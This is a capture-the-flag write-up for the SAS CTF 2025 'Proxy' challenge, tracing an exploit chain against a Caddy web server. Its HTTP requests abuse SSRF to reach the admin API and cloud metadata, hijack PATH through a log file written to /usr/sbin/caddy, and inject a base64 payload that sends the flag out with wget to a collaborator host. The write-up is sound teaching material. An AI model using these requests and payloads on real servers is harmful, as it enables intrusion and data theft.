---
title: "Proxy - SAS CTF 2025 Quals"
category: "web"
subcategory: "heap"
type: "writeup"
tags: ["caddy", "web", "heap", "ssrf", "imds", "base64", "nginx", "reverse-proxy", "sas-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "The exploit chain leverages Caddy's admin API to achieve RCE and flag exfiltration:"
source:
  name: "CTFtime writeup #40290"
  url: "https://ctftime.org/writeup/40290"
original_source: "https://github.com/Danr0/sas-ctf-writeup/blob/main/web_proxy.md"
ctf:
  name: "SAS CTF 2025 Quals"
  year: 2025
  challenge: "Proxy"
---

## Metadata

- **CTF:** SAS CTF 2025 Quals
- **Task:** Proxy
- **Author team:** LCD
- **CTFtime tags:** caddy, web
- **CTFtime:** <https://ctftime.org/writeup/40290>
- **Original writeup:** <https://github.com/Danr0/sas-ctf-writeup/blob/main/web_proxy.md>

---
## Proxy

## Exploit Summary  
The exploit chain leverages Caddy's admin API to achieve RCE and flag exfiltration:

1\. Arbitrary SSRF  
\- The initial Caddy configuration allows arbitrary SSRF via the reverse_proxy handler. This enables access to internal services like the admin API on `127.0.0.1:2019`.

2\. Admin API Abuse  
\- The `/load` endpoint allows dynamic configuration changes without server restart.   
\- We configure logging to write logs to `/usr/sbin/caddy` (earlier in `$PATH` than the real binary)  
\- Set permissions to `0777` (executable)

3\. Log Injection to RCE  
\- Use console format for cleaner output  
\- Trigger a 404 error with a malicious URL containing: Newline characters (`%0A%0D`) to break log formatting  
\- Pipeline to decode Base64-encoded payload and execute: `echo <b64>chmod 777 /[flag.sh](http://flag.sh); wget https://COLLAB/?a=$(cat /[flag.sh](http://flag.sh)|base64)</b64> | base64 -d | sh`

4\. Restart Server to Trigger  
\- Stop Caddy via `/stop` admin endpoint, causing the container's restart loop to execute our malicious `/usr/sbin/caddy` script.

### Task intro  
Description of the task:  
```  
Nowadays, some kind of connection transitivity is often required. We're quite new to this market, would you mind to check our MVP?   
```

We are given a Dockerfile, Caddyfile, compose file, `[flag.sh](http://flag.sh)` and `index.html` with static content. We can see that we are using the last version of the Caddy server in the docker container.   
```Docker  
FROM caddy:2.10-alpine  
RUN apk add --no-cache \  
python3-dev \  
py3-pip   
WORKDIR /app  
COPY index.html ./  
COPY Caddyfile ./  
RUN chmod 666 /app/index.html  
COPY [flag.sh](http://flag.sh) /  
RUN chmod 0000 /[flag.sh](http://flag.sh)  
CMD while true; do sh -c 'caddy run --config /app/Caddyfile'; done  
```

Also, we have 2 strange commands in the Docker file: chmod 000 and an infinite loop of running caddy by sh. As the capability of CAP_DAC_OVERRIDE is dropped in the compose file, we can't read the file with the flag even as root. So we have to achieve RCE or change permissions of the file.  
```  
services:  
caddy:  
build: .  
ports:  
\- 8888:80  
cap_drop:  
\- CAP_DAC_OVERRIDE  
```

By the way, what is caddy? Caddy is a modern, open-source web server platform designed to be simple, secure, and fast. Its standout features include automatic HTTPS by default (obtaining and renewing certificates) and a user-friendly configuration using the Caddyfile. It is used to host static files and as a reverse proxy, like Nginx. The author gives the next Caddyfile:

```  
:80 {  
@stripHostPort path_regexp stripHostPort ^\/([^\/]+?)(?::(\d+))?(\/.*)?$  
map {http.regexp.stripHostPort.2} {targetPort} {  
"" 80  
default {http.regexp.stripHostPort.2}  
}  
map {http.regexp.stripHostPort.3} {targetPath} {  
"" /  
default {http.regexp.stripHostPort.3}  
}  
handle @stripHostPort {  
rewrite {targetPath}  
reverse_proxy {http.regexp.stripHostPort.1}:{targetPort} {  
header_up Host {http.regexp.stripHostPort.1}:{targetPort}  
}  
}  
handle {  
root * ./  
file_server  
}  
}  
```

We have a web server on port 80, which has 2 handles. The second part of the config is not interesting; it just serves files from the current directory (for example, index.html).   
The first part is reverse_proxy, which takes 3 arguments: target host, port and path. Next, the server adds some headers and forwards the HTTP request to the target port. This is arbitrary SSRF with full output. And also, we can use any HTTP method and request body; they will also be forwarded. This is a very strong primitive to start with.

### SSRF to Admin API  
I am an author of the task "ProxyHell" (CTFZone 2022) and love tasks about proxies, so I managed to solve it during CTF. Firstly, we start analysing an attack surface by analysing the Docker container. Let's start by viewing the local ports (which is typical for SSRF challenges).   
```  
$ netstat -tuln  
Active Internet connections (only servers)  
Proto Recv-Q Send-Q Local Address Foreign Address State  
tcp 0 0 127.0.0.11:43547 0.0.0.0:* LISTEN  
tcp 0 0 127.0.0.1:2019 0.0.0.0:* LISTEN  
tcp 0 0 :::80 :::* LISTEN  
```  
We have some strange port 2019, which is accessible only from localhost and accepts HTTP connections. There is a metric endpoint (go pprof), which is accessible by SSRF `http://[container]/127.0.0.1:2019/debug/pprof/heap?debug=1`, but it doesn't give enough information for us. By opening the documentation, we can see that there is a special [admin API](<https://caddyserver.com/docs/api>). We can try to access it with SSRF, and it works. The API accepts proxy requests with X-forward. We can see the current configuration with the next request `http://[container]/127.0.0.1:2019/config/` and see the current configuration:

```http  
HTTP/1.1 200 OK  
Content-Length: 1006  
Content-Type: application/json  
Date: Sun, 25 May 2025 07:15:41 GMT  
Etag: "/config/ 57464b408cd1fac3"  
Via: 1.1 Caddy  
{"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"defaults":["{http.regexp.stripHostPort.2}"],"destinations":["{targetPort}"],"handler":"map","mappings":[{"outputs":[80]}],"source":"{http.regexp.stripHostPort.2}"},{"defaults":["{http.regexp.stripHostPort.3}"],"destinations":["{targetPath}"],"handler":"map","mappings":[{"outputs":["/"]}],"source":"{http.regexp.stripHostPort.3}"}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"group":"group0","handle":[{"handler":"rewrite","uri":"{targetPath}"}]},{"handle":[{"handler":"reverse_proxy","headers":{"request":{"set":{"Host":["{http.regexp.stripHostPort.1}:{targetPort}"]}}},"upstreams":[{"dial":"{http.regexp.stripHostPort.1}:{targetPort}"}]}]}]}],"match":[{"path_regexp":{"name":"stripHostPort","pattern":"^\\\/([^\\\/]+?)(?::(\\\d+))?(\\\/.*)?$"}}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"handle":[{"handler":"vars","root":"./"},{"handler":"file_server","hide":["/app/Caddyfile"]}]}]}]}]}}}}}  
```

### Custom configuration with RCE module  
We can access the admin API and send any POST request, so the next step is to achieve RCE, but how?. The admin API `/load` can be used to override current configuration in real time with a simple POST request. I searched for some RCE potential and found [module "exec"](<https://caddyserver.com/docs/modules/events.handlers.exec>). The description of the module is very simple:  
```  
events.handlers.exec implements an event handler that runs a command/program. By default, commands are run in the background so as to not block the Caddy goroutine.  
```  
So we have a very easy way to RCE. Let's rewrite the current configuration:

```http  
POST /127.0.0.1:2019/load HTTP/1.1  
Host: [container]  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Content-Type: application/json  
Content-Length: 613  
{  
"apps": {  
"http": {  
"servers": {  
"exploit": {  
"listen": [":31337"],   
"routes": [  
{  
"match": [{"path": ["/trigger"]}],  
"handle": [  
{  
"handler": "exec",  
"command": "id",   
"args": [],  
"timeout": 10  
},  
{  
"handler": "static_response",  
"body": "Exploit executed"  
}  
]  
}  
]  
}  
}  
}  
}  
}  
```

And we got an error; that module is unknown. Oops, this will not be that easy. Why can't we use this module? Because it's not standard and has to be installed additionally.   
```http  
HTTP/1.1 400 Bad Request  
Content-Length: 236  
Content-Type: application/json  
Date: Sat, 24 May 2025 17:46:01 GMT  
Via: 1.1 Caddy  
{"error":"loading config: loading new config: loading http app module: provision http: server exploit: setting up route handlers: route 0: loading handler modules: position 0: loading module 'exec': unknown module: http.handlers.exec"}  
```

The next step is to analyse only standard modules to create something interesting. We can see all modules in [the official documentation](<https://caddyserver.com/docs/modules/).###> SSRF to Cloud meta server  
But before we continue, I had one more idea. The service is running in the cloud, so can we use SSRF to access the cloud meta server:  
```http  
GET /169.254.169.254/latest/meta-data HTTP/2  
Host: <uuid>.kit.sasc.tf  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Te: trailers  
```

But we can't access it:  
```http  
HTTP/2 400 Bad Request  
Server: ycalb  
Date: Sun, 25 May 2025 07:07:11 GMT  
Content-Type: text/plain; charset=utf-8  
Content-Length: 33  
Etag: b77d39066335d22d29e536f9fc196630  
Via: 1.1 Caddy  
X-Content-Type-Options: nosniff  
Proxied requests are not allowed  
```

Caddy adds 3 headers, which are blocked by the cloud API:  
```http  
X-Forwarded-For: 192.168.65.1  
X-Forwarded-Host: [container]  
X-Forwarded-Proto: http  
```

We have access to the admin API, so we can just drop them by changing the current configuration:  
```  
POST /127.0.0.1:2019/load HTTP/2  
Host: <uuid>.kit.sasc.tf  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Te: trailers  
Connection: keep-alive  
Content-Type: application/json  
Content-Length: 1080  
{"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"defaults":["{http.regexp.stripHostPort.2}"],"destinations":["{targetPort}"],"handler":"map","mappings":[{"outputs":[80]}],"source":"{http.regexp.stripHostPort.2}"},{"defaults":["{http.regexp.stripHostPort.3}"],"destinations":["{targetPath}"],"handler":"map","mappings":[{"outputs":["/"]}],"source":"{http.regexp.stripHostPort.3}"}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"group":"group0","handle":[{"handler":"rewrite","uri":"{targetPath}"}]},{"handle":[{"handler":"reverse_proxy","headers":{"request":{"set":{"Host":["{http.regexp.stripHostPort.1}:{targetPort}"]},"delete":["X-Forwarded-For","Via","X-Forwarded-Host","X-Forwarded-Proto"]}},"upstreams":[{"dial":"{http.regexp.stripHostPort.1}:{targetPort}"}]}]}]}],"match":[{"path_regexp":{"name":"stripHostPort","pattern":"^\\\/([^\\\/]+?)(?::(\\\d+))?(\\\/.*)?$"}}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"handle":[{"handler":"vars","root":"/"},{"handler":"file_server","hide":["/app/Caddyfile"]}]}]}]}]}}}}}  
```

Finally, we have full SSRF and can access the cloud API. I tried to access the security credentials of the container `https://<uuid>.kit.sasc.tf/169.254.169.254/latest/meta-data/iam/security-credentials/default`, but there is no token for this container.

```http  
HTTP/2 400 Bad Request  
Server: ycalb  
Date: Sun, 25 May 2025 07:49:14 GMT  
Content-Type: text/plain; charset=utf-8  
Content-Length: 44  
Etag: aeb61aa4382bbd78d26265397eacff49  
Via: 1.1 Caddy  
Token is disabled for "fv4em6ihrthp2tbj12l3"  
```  
### File read

Okay, let's try to just read the flag. We are root inside the container, so we can read almost every file. The next request creates file_server at `/` directory.  
```http  
POST /127.0.0.1:2019/load HTTP/1.1  
Host: [container]  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Content-Type: application/json  
Content-Length: 510  
{  
"http": {  
"servers": {  
"example": {  
"listen": [":80"],  
"routes": [  
{  
"handle": [  
{  
"handler": "file_server",  
"root": "/"  
}  
]  
}  
]  
}  
}  
}  
}  
}  
```

And we can read files with simple requests: `http://[container]/etc/passwd`

```http  
HTTP/1.1 200 OK  
Accept-Ranges: bytes  
Content-Length: 702  
Etag: "d6t3iycrbpc0ji"  
Last-Modified: Sat, 04 Jan 2025 07:04:48 GMT  
Server: Caddy  
Vary: Accept-Encoding  
Date: Sat, 24 May 2025 17:19:42 GMT  
root:x:0:0:root:/root:/bin/sh  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/mail:/sbin/nologin  
news:x:9:13:news:/usr/lib/news:/sbin/nologin  
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin  
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin  
ftp:x:21:21::/var/lib/ftp:/sbin/nologin  
sshd:x:22:22:sshd:/dev/null:/sbin/nologin  
games:x:35:35:games:/usr/games:/sbin/nologin  
ntp:x:123:123:NTP:/var/empty:/sbin/nologin  
guest:x:405:100:guest:/dev/null:/sbin/nologin  
nobody:x:65534:65534:nobody:/:/sbin/nologin  
```

If we try to read the flag by accessing `http://[container]/[flag.sh](http://flag.sh)`, we will get a 403 error. This is because root can't read the file. We need some way to change the permissions of the file.I cloned the Git repository with the source code of Caddy and searched for `os.Chmod`. The first usage in `caddy/listeners.go`, but it's used only for Unix sockets:

```go  
if IsUnixNetwork(na.Network) {  
isAbstractUnixSocket := strings.HasPrefix(address, "@")  
if !isAbstractUnixSocket {  
err = os.Chmod(address, unixFileMode)  
if err != nil {  
return nil, fmt.Errorf("unable to set permissions (%s) on %s: %v", unixFileMode, address, err)  
}  
}  
}  
```

The second usage in `caddy/modules/logging/filewriter.go`, which is used for a logger. We can search for mode in the documentation and get [a description](<https://caddyserver.com/docs/json/logging/logs/writer/file/mode/>) of the permissions mode of the file. 

```go  
file, err := os.OpenFile(fw.Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, modeIfCreating)  
if err != nil {  
return nil, err  
}  
info, err := file.Stat()  
if roll {  
file.Close() // lumberjack will reopen it on its own  
}  
// Ensure already existing files have the right mode, since OpenFile will not set the mode in such case.  
if configuredMode := os.FileMode(fw.Mode); configuredMode != 0 {  
if err != nil {  
return nil, fmt.Errorf("unable to stat log file to see if we need to set permissions: %v", err)  
}  
// only chmod if the configured mode is different  
if info.Mode()&os.ModePerm != configuredMode&os.ModePerm {  
if err = os.Chmod(fw.Filename, configuredMode); err != nil {  
return nil, err  
}  
}  
}  
```

That is what we needed. Let's try to rewrite the mode of the flag.  
```http  
POST /127.0.0.1:2019/load HTTP/1.1  
Host: [container]  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Content-Type: application/json  
Content-Length: 633  
{  
"logging": {  
"logs": {  
"default": {  
"exclude": ["http.log.access"],  
"writer": {  
"output": "file",  
"filename": "/[flag.sh](http://flag.sh)",  
"mode": "0777"  
}  
}  
}  
},  
"apps": {  
"http": {  
"servers": {  
"example": {  
"listen": [":80"],  
"routes": [  
{  
"handle": [  
{  
"handler": "file_server",  
"root": "/",  
"browse": true  
}  
]  
}  
]  
}  
}  
}  
}  
}  
```

But we again get the error of opening the file. The server opens the file before changing the permissions. We have to try harder.  
```http  
HTTP/1.1 400 Bad Request  
Content-Length: 300  
Content-Type: application/json  
Date: Sat, 24 May 2025 19:16:22 GMT  
Via: 1.1 Caddy  
{"error":"loading config: loading new config: setting up default log: opening log writer using \u0026logging.FileWriter{Filename:\"/[flag.sh](http://flag.sh)\", Mode:0x1ff, Roll:(*bool)(nil), RollSizeMB:0, RollCompress:(*bool)(nil), RollLocalTime:false, RollKeep:0, RollKeepDays:0}: open /[flag.sh](http://flag.sh): permission denied"}  
```

### File write with arbitrary permissions

Now we have a very strong primitive: arbitrary file write with arbitrary permissions. What do we want to rewrite? The container doesn't have cron jobs or other processes. The obvious way is LD_PRELOAD, but we potentially can write only printable characters. As we can see in the Docker file, 2 files are used in an infinite loop: sh and caddy. Let's try to rewrite them:  
For sh, we go error: `open /bin/sh: text file busy`, because the file is used constantly. And for caddy error is `open /usr/bin/caddy: permission denied`, because the user with ID 1001 is the owner of this binary (not root).  
At this time I had to sleep and generate new ideas. So we have file write; what is a way to hijack the execution of command? The key idea is that Docker commands contain relative paths of binaries, not absolute! We can check the `$PATH` variable to find out the search order of binary files:  
`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`. The path `/usr/sbin/` exists in the container and is used before `/usr/bin`. If we write to `/usr/sbin/caddy`, then this file will be used instead of the original binary. Let's create a log file with our logs:

```http  
POST /127.0.0.1:2019/load HTTP/1.1  
Host: [container]  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Content-Type: application/json  
Content-Length: 1658  
{ "logging": {  
"logs": {  
"default": {  
"writer": {  
"output": "file",  
"filename": "/usr/sbin/caddy",  
"mode": "0777"  
},"level": "error",  
"encoder": {  
...  
```

The next problem is that the server has to be stopped. How can we stop the current server? The basic idea of a crash is good, but there is an easy way. We have access to the admin API, which can be used to just stop the current server. So we just send a request to this API [/stop](<https://caddyserver.com/docs/api#post-stop>) and the server will be restarted. After restart, we can see errors of running our file with sh:  
```  
echo: not found/sbin/caddy: line 2:  
caddy-1 | /usr/sbin/caddy: line 1: 2025/05/25: not found  
echo: not found/sbin/caddy: line 2:  
caddy-1 | /usr/sbin/caddy: line 1: 2025/05/25: not found  
echo: not found/sbin/caddy: line 2:  
caddy-1 | /usr/sbin/caddy: line 1: 2025/05/25: not found  
echo: not found/sbin/caddy: line 2:  
caddy-1 | /usr/sbin/caddy: line 1: 2025/05/25: not found  
echo: not found/sbin/caddy: line 2:  
caddy-1 | /usr/sbin/caddy: line 1: 2025/05/25: not found  
```

### File write with arbitrary permissions and controlled content

Now we have the ability to execute our file by sh. The main problem is that the log file has a strict format. We have spent some time to analyse documentation and found a way to create valid sh scripts. The default format is JSON, but we can change it to cleartext. This request will create an executable log file with only errors because we don't need starting and info-level messages:  
```http  
POST /127.0.0.1:2019/load HTTP/1.1  
Host: [container]  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Priority: u=0, i  
Content-Type: application/json  
Content-Length: 1658  
{ "logging": {  
"logs": {  
"default": {  
"writer": {  
"output": "file",  
"filename": "/usr/sbin/caddy",  
"mode": "0777"  
},"level": "error",  
"encoder": {  
"fields": {  
"common_log": {  
"filter": "delete"  
}  
},  
"format": "filter",  
"wrap": {  
"format": "console",  
"level_key": "severity",  
"message_key": "message",  
"time_key": "timestampSeconds"  
}  
}  
}  
}  
},"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"defaults":["{http.regexp.stripHostPort.2}"],"destinations":["{targetPort}"],"handler":"map","mappings":[{"outputs":[80]}],"source":"{http.regexp.stripHostPort.2}"},{"defaults":["{http.regexp.stripHostPort.3}"],"destinations":["{targetPath}"],"handler":"map","mappings":[{"outputs":["/"]}],"source":"{http.regexp.stripHostPort.3}"}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"group":"group0","handle":[{"handler":"rewrite","uri":"{targetPath}"}]},{"handle":[{"handler":"reverse_proxy","headers":{"request":{"set":{"Host":["{http.regexp.stripHostPort.1}:{targetPort}"]},"delete":["X-Forwarded-For","Via","X-Forwarded-Host","X-Forwarded-Proto"]}},"upstreams":[{"dial":"{http.regexp.stripHostPort.1}:{targetPort}"}]}]}]}],"match":[{"path_regexp":{"name":"stripHostPort","pattern":"^\\\/([^\\\/]+?)(?::(\\\d+))?(\\\/.*)?$"}}]},{"group":"group2","handle":[{"handler":"subroute","routes":[{"handle":[{"handler":"vars","root":"/"},{"handler":"file_server","hide":["/app/Caddyfile"]}]}]}]}]}}}}}  
```  
Binary sh executes a file line by line, so the easiest way is to find a way to create a new line with our payload. The server decodes the URL path before writing it to the log. We can send a new line via the URL-encoded value `%0A%0D`. Also, we can add the comment `#` to the end. The only problem is that we can't use `/`, because it will break the log format. To bypass this restriction, we can use the usual pipe way:   
```bash  
echo <base64>chmod 777 /[flag.sh](http://flag.sh);wget https://<collaborator>/?a=`cat /[flag.sh](http://flag.sh)|base64`</base64>|base64 -d|sh  
```  
Now we can trigger a 404 error and write the payload to the log file:  
```bash  
http://[container]/asd%0A%0Decho%20Y2htb2QgNzc3IC9mbGFnLnNoO3dnZXQgaHR0cHM6Ly88Y29sbGFib3JhdG9yPi8/YT1gY2F0IC9mbGFnLnNofGJhc2U2NGA=|base64%20-d|sh%20%23  
```  
After request log file contains the next data:  
```  
2025/05/25 11:11:01.426 ERROR http.log.error dial tcp: lookup asd  
echo Y2htb2QgNzc3IC9mbGFnLnNoO3dnZXQgaHR0cHM6Ly88Y29sbGFib3JhdG9yPi8/YT1gY2F0IC9mbGFnLnNofGJhc2U2NGA=|base64 -d|sh #: no such host {"request": {"remote_ip": "192.168.65.1", "remote_port": "21150", "client_ip": "192.168.65.1", "proto": "HTTP/1.1", "method": "GET", "host": "[container]", "uri": "/asd%0A%0Decho%20Y2htb2QgNzc3IC9mbGFnLnNoO3dnZXQgaHR0cHM6Ly88Y29sbGFib3JhdG9yPi8/YT1gY2F0IC9mbGFnLnNofGJhc2U2NGA=|base64+-d|sh%20%23", "headers": {"Sec-Fetch-Site": ["none"], "Upgrade-Insecure-Requests": ["1"], "Sec-Fetch-Mode": ["navigate"], "Sec-Fetch-User": ["?1"], "Accept": ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"], "Accept-Language": ["en-US,en;q=0.5"], "Sec-Fetch-Dest": ["document"], "Priority": ["u=0, i"], "User-Agent": ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0"], "Accept-Encoding": ["gzip, deflate, br"], "Connection": ["keep-alive"]}}, "duration": 0.001161833, "status": 502, "err_id": "j9ckvd3i0", "err_trace": "reverseproxy.statusError (reverseproxy.go:1390)"}  
```  
The final step is to stop the server and trigger the payload:  
```  
http://[container]/127.0.0.1:2019/stop  
```
